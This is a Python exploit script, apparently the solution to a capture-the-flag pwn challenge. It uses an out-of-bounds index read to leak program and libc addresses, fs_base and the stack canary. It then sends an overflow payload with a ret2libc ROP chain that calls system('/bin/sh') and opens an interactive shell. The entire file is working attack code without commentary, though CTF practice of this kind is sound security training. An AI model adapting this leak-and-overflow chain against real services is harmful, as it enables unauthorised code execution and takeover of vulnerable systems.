from ptrlib import *
import time
import os

def read(index):
    sock.sendlineafter("index: ", str(index))
    return int(sock.recvline())

def ofs(addr):
    return (addr - addr_array) // 8

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9004"))

elf = ELF("../distfiles/chall")
libc = ELF("../distfiles/libc.so.6")

while True:
    libc.base = 0
    elf.base = 0
    #sock = Process("./chall", cwd="../distfiles")
    sock = Socket(HOST, PORT)

    elf.base = read(-5) - elf.symbol('main') - 201

    addr_array = read(-2) - 0x60
    logger.info("array = " + hex(addr_array))

    libc.base = read(ofs(elf.got('atoll'))) - libc.symbol('atoll')
    if libc.base & 0xfff != 0:
        logger.error("Bad luck!")
        sock.close()
        continue

    fs_base = read(ofs(addr_array-0x728))
    logger.info("fs_base = " + hex(fs_base))
    if fs_base & 0xfff != 0x740:
        logger.error("Bad luck!")
        sock.close()
        continue

    canary = read(ofs(fs_base + 0x28))
    logger.info("canary = " + hex(canary))
    if canary & 0xff != 0:
        logger.error("Bad luck!")
        sock.close()
        continue

    payload  = b"12345\0"
    payload += b"A"*(0x28 - len(payload))
    payload += p64(canary)
    payload += b"A"*8
    payload += p64(next(libc.gadget("ret;")))
    payload += p64(next(libc.gadget("pop rdi; ret;")))
    payload += p64(next(libc.find("/bin/sh")))
    payload += p64(libc.symbol("system"))
    sock.sendlineafter("index: ", payload)

    sock.sh()
    break

